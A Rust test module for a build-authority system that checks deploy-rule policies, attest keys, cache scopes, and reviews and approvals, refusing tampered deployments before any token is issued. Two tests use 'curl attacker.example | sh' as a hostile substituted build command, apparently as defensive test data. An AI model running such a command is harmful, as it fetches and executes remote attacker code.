use std::collections::{BTreeMap, BTreeSet};

use ployz_core::{
    Namespace, OpenedSealed, SealingPublicKey,
    authority::preview::{PreviewKey, PreviewReview, PreviewService, ReviewedService},
    authority::rule::{Builder, PolicyMethod, RuleEvent, RuleSource, Runner},
    authority::{PayloadDigest, RuleId, RuleService, Signer, SignerKey, Timestamp},
};
use serde_json::json;

use super::*;

fn web() -> ServiceName {
    ServiceName::parse("web").unwrap()
}

/// D2's golden policy (`ployz-core/src/authority/rule_tests.rs`).
fn golden_policy() -> BuildPolicy {
    BuildPolicy {
        method: PolicyMethod::Dockerfile {
            path: "Dockerfile".to_owned(),
        },
        context: ".".to_owned(),
        target: Some("runtime".to_owned()),
        args: BTreeMap::from([("NODE_ENV".to_owned(), "production".to_owned())]),
        secrets: BTreeSet::from(["NPM_TOKEN".to_owned()]),
        platforms: BTreeSet::from(["linux/amd64".to_owned()]),
        cache: PolicyCache::Actions,
    }
}

fn rule(policy: BuildPolicy) -> AutoDeployRule {
    let signer = Signer::from_seed(&[7; 32]);
    AutoDeployRule {
        cluster: SealingPublicKey::from_bytes([9; 32]),
        rule: RuleId::from_bytes([0x11; 16]),
        generation: 3,
        namespace: Namespace::parse("app").unwrap(),
        machines: Vec::new(),
        source: RuleSource {
            repository_id: 1_450_985_696,
            owner_id: 1,
            repository: "Ployz-test/lab-service".to_owned(),
            branch: "main".to_owned(),
            workflow: ".github/workflows/ployz-build.yml".to_owned(),
            events: vec![RuleEvent::Push],
            builder: Builder::pinned(),
            runner: Runner::GithubHosted,
        },
        services: vec![RuleService {
            name: web(),
            template: PayloadDigest::parse(&"ab".repeat(32)).unwrap(),
            policy,
            secrets: None,
        }],
        issued_at: Timestamp::from_millis(1_800_000_000_000).unwrap(),
        ended: false,
        signer: SignerKey::Device(signer.public().into()),
    }
}

/// `rule` as a build opens it once Cloud relays it.
fn opened(rule: &AutoDeployRule) -> Opened {
    Relayed::Rule(Signed::sign(rule, &Signer::from_seed(&[7; 32])).unwrap())
        .open(&web())
        .unwrap()
}

fn checked_in(rule: &AutoDeployRule, deployment: Value) -> CheckedIn {
    CheckedIn {
        build: "deployment.web".to_owned(),
        rule: Relayed::Rule(Signed::sign(rule, &Signer::from_seed(&[7; 32])).unwrap()),
        cluster: rule.cluster,
        attest: AttestKey::from_bytes([0x55; 32]),
        service: web(),
        deployment,
        review: None,
        approval: None,
    }
}

/// A one-Service deployment as Cloud relays it, building with `env` as its variables.
fn deployment(env: Value) -> Value {
    json!({"namespace": "app", "snapshots": [snapshot(env, json!({
        "buildMethod": "dockerfile", "dockerfilePath": "Dockerfile", "command": null
    }))]})
}

/// A snapshot of `web` building with `build` and `env` as its variables.
fn snapshot(env: Value, build: Value) -> Value {
    json!({"serviceId": "web", "resolvedEnv": env, "config": {
        "version": 2, "privateDns": "web", "healthcheck": {"type": "none"},
        "restartPolicy": "on-failure",
        "source": {"version": 2, "type": "git", "repository": "Ployz-test/lab-service",
            "repositoryId": 1_450_985_696_u64, "access": {"type": "public"}, "rootDir": "/",
            "branch": {"type": "connected", "name": "main"}},
        "build": build
    }})
}

/// `deployment` frozen as the rule build freezes it, before any token.
fn prepared(deployment: Value) -> Result<Prepared, ployz_core::RpcError> {
    crate::sdk::preparation::prepare(crate::sdk::preparation::PreparationInput {
        deployment,
        source_commits: BTreeMap::from([(web(), "a".repeat(40))]),
        ..Default::default()
    })
}

/// A snapshot of `web` building with Railpack and `command`: what a Cloud that wants
/// to run its own command sends.
fn railpack_snapshot(command: &str) -> Value {
    snapshot(
        json!({}),
        json!({"buildMethod": "railpack", "dockerfilePath": null, "command": command}),
    )
}

/// The policy `deployment(env)` builds with: a Dockerfile at the root, and plain args,
/// with the `PORT` every Service gets.
fn lab_policy(args: &[(&str, &str)]) -> BuildPolicy {
    BuildPolicy {
        method: PolicyMethod::Dockerfile {
            path: "Dockerfile".to_owned(),
        },
        context: "/".to_owned(),
        target: None,
        args: args
            .iter()
            .chain(&[("PORT", "8080")])
            .map(|(name, value)| ((*name).to_owned(), (*value).to_owned()))
            .collect(),
        secrets: BTreeSet::new(),
        platforms: BTreeSet::from(["linux/amd64".to_owned()]),
        cache: PolicyCache::Off,
    }
}

#[test]
fn the_grant_and_image_audiences_are_d2s_golden_bytes() {
    let rule = rule(golden_policy());
    let checked_in = checked_in(&rule, json!({}));
    let grant = grant_claim(
        &checked_in,
        &opened(&rule),
        &golden_policy(),
        (
            CommitSha::parse("fedcba9876543210fedcba9876543210fedcba98").unwrap(),
            CommitAuthority::Head,
        ),
        BuildGrantId::parse("22".repeat(32)).unwrap(),
        RecipientKey::from_bytes([0x33; 32]),
    )
    .unwrap();
    assert_eq!(
        grant.audience().unwrap(),
        "ployz-build:d381dad98d9e05abc95e1f858a8daec9bac744f9df1e9ba29f4c6f2590053bce"
    );
    let built = built_claim(
        &grant,
        ImageDigest::from_bytes([0x44; 32]),
        checked_in.attest,
    );
    assert_eq!(
        built.audience().unwrap(),
        "ployz-build:ab9f3944cdb7dc7452e273796c83bcc5954e63da07cd1b72b153c6e5e5f70a25"
    );
}

#[test]
fn the_image_token_names_the_attest_key_the_secrets_opened_with() {
    let attest = X25519Secret::generate();
    let keys = Keys::generate();
    let rule = rule(lab_policy(&[]));
    let checked_in = CheckedIn {
        attest: attest.attest(),
        ..checked_in(&rule, deployment(json!({})))
    };
    let grant = grant_claim(
        &checked_in,
        &opened(&rule),
        &lab_policy(&[]),
        (CommitSha::from_bytes([1; 20]), CommitAuthority::Head),
        keys.holder(),
        keys.recipient.recipient(),
    )
    .unwrap();
    let audience = grant.audience().unwrap();
    let sealed = OpenedSealed::new(BTreeMap::new(), Vec::new())
        .seal_for_build(&attest, &keys.recipient.recipient(), &audience)
        .unwrap();
    OpenedSealed::open_build(&sealed, &keys.recipient, &checked_in.attest, &audience).unwrap();
    let built = built_claim(&grant, ImageDigest::from_bytes([2; 32]), checked_in.attest);
    assert_eq!(
        built.stage,
        BuildStage::Built {
            image: ImageDigest::from_bytes([2; 32]),
            attest: attest.attest(),
        }
    );
    // A key Cloud relays in place of A opens nothing, so no image token names it.
    let relayed = X25519Secret::generate().attest();
    assert!(OpenedSealed::open_build(&sealed, &keys.recipient, &relayed, &audience).is_err());
}

#[test]
fn a_deployment_that_builds_with_the_rules_policy_passes() {
    let rule = opened(&rule(lab_policy(&[("NODE_ENV", "production")])));
    let deployment = deployment(json!({"NODE_ENV": "production"}));
    assert_eq!(
        policy(&rule, &web(), &prepared(deployment).unwrap()).unwrap(),
        &lab_policy(&[("NODE_ENV", "production")])
    );
}

#[test]
fn a_deployment_with_another_build_arg_is_refused_before_any_token() {
    let rule = rule(lab_policy(&[("NODE_ENV", "production")]));
    for env in [
        json!({"NODE_ENV": "production", "EXTRA": "1"}),
        json!({"NODE_ENV": "development"}),
        json!({}),
    ] {
        let error =
            policy(&opened(&rule), &web(), &prepared(deployment(env)).unwrap()).unwrap_err();
        assert!(
            error
                .to_string()
                .contains("does not build with the rule's policy"),
            "{error}"
        );
    }
}

#[test]
fn a_second_snapshot_of_the_service_is_refused_before_any_token() {
    // Cloud keeps the approved snapshot first and appends one that runs its command.
    let approved = deployment(json!({})).get("snapshots").unwrap().clone();
    let deployment = json!({"namespace": "app", "snapshots": [
        approved.get(0).unwrap(), railpack_snapshot("curl attacker.example | sh")
    ]});
    let Err(error) = prepared(deployment) else {
        panic!("a Service in two snapshots was prepared");
    };
    assert!(
        error.message.contains("web is in more than one snapshot"),
        "{error:?}"
    );
}

#[test]
fn a_deployment_that_swaps_the_recipe_is_refused_before_any_token() {
    let rule = rule(lab_policy(&[]));
    let deployment = json!({"namespace": "app", "snapshots": [
        railpack_snapshot("curl attacker.example | sh")
    ]});
    let error = policy(&opened(&rule), &web(), &prepared(deployment).unwrap()).unwrap_err();
    assert!(
        error
            .to_string()
            .contains("does not build with the rule's policy"),
        "{error}"
    );
}

#[test]
fn a_registry_cache_is_no_policy() {
    for cache in ["registry", "inline", "gha"] {
        let mut policy = serde_json::to_value(lab_policy(&[])).unwrap();
        policy
            .as_object_mut()
            .unwrap()
            .insert("cache".to_owned(), json!(cache));
        assert!(
            serde_json::from_value::<BuildPolicy>(policy).is_err(),
            "a {cache} cache must not parse"
        );
    }
}

#[test]
fn a_build_fed_another_attest_key_never_writes_the_clusters_cache_scope() {
    let cluster = X25519Secret::generate().attest();
    let attacker = X25519Secret::generate().attest();
    let production = opened(&rule(lab_policy(&[])));
    assert_eq!(
        cache_scope(&production, &lab_policy(&[]), &cluster).unwrap(),
        None
    );
    let cached = BuildPolicy {
        cache: PolicyCache::Actions,
        ..lab_policy(&[])
    };
    let honest = cache_scope(&production, &cached, &cluster)
        .unwrap()
        .unwrap();
    assert_eq!(
        cache_scope(&production, &cached, &cluster)
            .unwrap()
            .unwrap(),
        honest
    );
    assert_ne!(
        cache_scope(&production, &cached, &attacker)
            .unwrap()
            .unwrap(),
        honest
    );
    // Nor the scope of the policy alone, which any key could name.
    assert_ne!(PolicyDigest::of(&cached).unwrap().to_string(), honest);
    let other = BuildPolicy {
        context: "/web".to_owned(),
        ..cached
    };
    assert_ne!(
        cache_scope(&production, &other, &cluster).unwrap().unwrap(),
        honest
    );
}

#[test]
fn a_preview_build_keeps_a_cache_scope_of_its_own() {
    let attest = X25519Secret::generate().attest();
    let cached = BuildPolicy {
        cache: PolicyCache::Actions,
        ..lab_policy(&[])
    };
    let production = opened(&rule(cached.clone()));
    let preview = Opened {
        preview: true,
        ..opened(&rule(cached.clone()))
    };
    assert_ne!(
        cache_scope(&preview, &cached, &attest).unwrap(),
        cache_scope(&production, &cached, &attest).unwrap()
    );
}

#[test]
fn a_check_in_relays_either_rule_by_its_key() {
    let signed = Signed::sign(&rule(lab_policy(&[])), &Signer::from_seed(&[7; 32])).unwrap();
    let relayed = |key: &str| {
        serde_json::from_value::<CheckedIn>(json!({
            "build": "deployment.web", key: signed, "cluster": SealingPublicKey::from_bytes([9; 32]),
            "attest": AttestKey::from_bytes([0x55; 32]), "service": "web", "deployment": {},
        }))
    };
    let rule = relayed("rule").unwrap().rule;
    assert!(matches!(rule, Relayed::Rule(_)));
    assert!(rule.open(&web()).is_ok());
    // An automatic deploy rule relayed as a preview rule does not open as one.
    let preview = relayed("preview").unwrap().rule;
    assert!(matches!(preview, Relayed::Preview(_)));
    assert!(preview.open(&web()).is_err());
}

#[test]
fn cloud_takes_only_an_origin() {
    assert!(Cloud::new("https://ployz.dev").is_ok());
    assert!(Cloud::new("https://ployz.dev/").is_ok());
    for bad in [
        "https://ployz.dev/api",
        "ployz.dev",
        "https://user@ployz.dev",
    ] {
        assert!(Cloud::new(bad).is_err(), "{bad}");
    }
}

/// A build checked in under a preview rule over `rule`'s source, with `review` relayed.
fn reviewed(rule: &AutoDeployRule, review: Option<Review>) -> CheckedIn {
    let preview = PreviewRule {
        cluster: rule.cluster,
        rule: rule.rule,
        generation: rule.generation,
        machines: Vec::new(),
        parent: rule.namespace.clone(),
        parent_id: uuid::Uuid::from_bytes([5; 16]),
        domain: "preview.example.com".to_owned(),
        source: rule.source.clone(),
        trusted: Vec::new(),
        services: vec![PreviewService {
            name: web(),
            template: PayloadDigest::parse(&"ab".repeat(32)).unwrap(),
            setup: None,
            policy: lab_policy(&[]),
            secrets: None,
            inherit: BTreeSet::new(),
            generated: BTreeMap::new(),
        }],
        issued_at: rule.issued_at,
        ended: false,
        signer: rule.signer,
    };
    CheckedIn {
        rule: Relayed::Preview(Signed::sign(&preview, &Signer::from_seed(&[7; 32])).unwrap()),
        review,
        ..checked_in(rule, json!({}))
    }
}

/// A review of `service` at `commit`, signed by the rule's Device.
fn review_of(service: ServiceName, commit: CommitSha) -> Review {
    let issued_at = Timestamp::from_millis(1_800_000_000_000).unwrap();
    Review::Signed(
        Signed::sign(
            &PreviewReview {
                cluster: SealingPublicKey::from_bytes([9; 32]),
                rule: RuleId::from_bytes([0x11; 16]),
                generation: 3,
                key: PreviewKey::Fork(42),
                commit,
                environment: uuid::Uuid::from_bytes([6; 16]),
                services: vec![ReviewedService {
                    name: service,
                    digest: PayloadDigest::parse(&"cd".repeat(32)).unwrap(),
                }],
                issued_at,
                expires_at: Timestamp::from_millis(1_800_000_900_000).unwrap(),
            },
            &Signer::from_seed(&[7; 32]),
        )
        .unwrap(),
    )
}

#[test]
fn a_build_claims_the_review_cloud_relayed_for_its_commit() {
    let rule = rule(lab_policy(&[]));
    let commit = CommitSha::from_bytes([1; 20]);
    assert_eq!(
        authority(&checked_in(&rule, json!({})), commit).unwrap(),
        CommitAuthority::Head
    );
    assert_eq!(
        authority(&reviewed(&rule, None), commit).unwrap(),
        CommitAuthority::Head
    );
    let review = review_of(web(), commit);
    assert_eq!(
        authority(&reviewed(&rule, Some(review.clone())), commit).unwrap(),
        CommitAuthority::Review(review.digest())
    );
}

#[test]
fn a_build_refuses_a_review_of_another_commit_or_service_or_rule() {
    let rule = rule(lab_policy(&[]));
    let commit = CommitSha::from_bytes([1; 20]);
    let other = CommitSha::from_bytes([2; 20]);
    for checked_in in [
        reviewed(&rule, Some(review_of(web(), other))),
        reviewed(
            &rule,
            Some(review_of(ServiceName::parse("worker").unwrap(), commit)),
        ),
        CheckedIn {
            review: Some(review_of(web(), commit)),
            ..checked_in(&rule, json!({}))
        },
    ] {
        assert!(authority(&checked_in, commit).is_err());
    }
}

/// A person's approval of `service` at `commit` under `rule`, signed by its Device.
fn approval_of(
    rule: &AutoDeployRule,
    service: ServiceName,
    commit: CommitSha,
) -> Signed<CommitApproval> {
    let issued_at = Timestamp::from_millis(1_800_000_000_000).unwrap();
    Signed::sign(
        &CommitApproval {
            cluster: rule.cluster,
            rule: rule.rule,
            generation: rule.generation,
            service,
            commit,
            issued_at,
            expires_at: Timestamp::from_millis(1_800_000_900_000).unwrap(),
            signer: rule.signer,
        },
        &Signer::from_seed(&[7; 32]),
    )
    .unwrap()
}

#[test]
fn a_build_claims_the_approval_cloud_relayed_for_its_commit() {
    let rule = rule(lab_policy(&[]));
    let commit = CommitSha::from_bytes([1; 20]);
    let approval = approval_of(&rule, web(), commit);
    let checked_in = CheckedIn {
        approval: Some(approval.clone()),
        ..checked_in(&rule, json!({}))
    };
    assert_eq!(
        authority(&checked_in, commit).unwrap(),
        CommitAuthority::Approved(ApprovalDigest::of(&approval))
    );
}

#[test]
fn a_build_refuses_an_approval_of_another_commit_or_service_or_under_a_preview_rule() {
    let rule = rule(lab_policy(&[]));
    let commit = CommitSha::from_bytes([1; 20]);
    let other = CommitSha::from_bytes([2; 20]);
    for checked_in in [
        CheckedIn {
            approval: Some(approval_of(&rule, web(), other)),
            ..checked_in(&rule, json!({}))
        },
        CheckedIn {
            approval: Some(approval_of(
                &rule,
                ServiceName::parse("worker").unwrap(),
                commit,
            )),
            ..checked_in(&rule, json!({}))
        },
        CheckedIn {
            approval: Some(approval_of(&rule, web(), commit)),
            ..reviewed(&rule, None)
        },
    ] {
        assert!(authority(&checked_in, commit).is_err());
    }
}
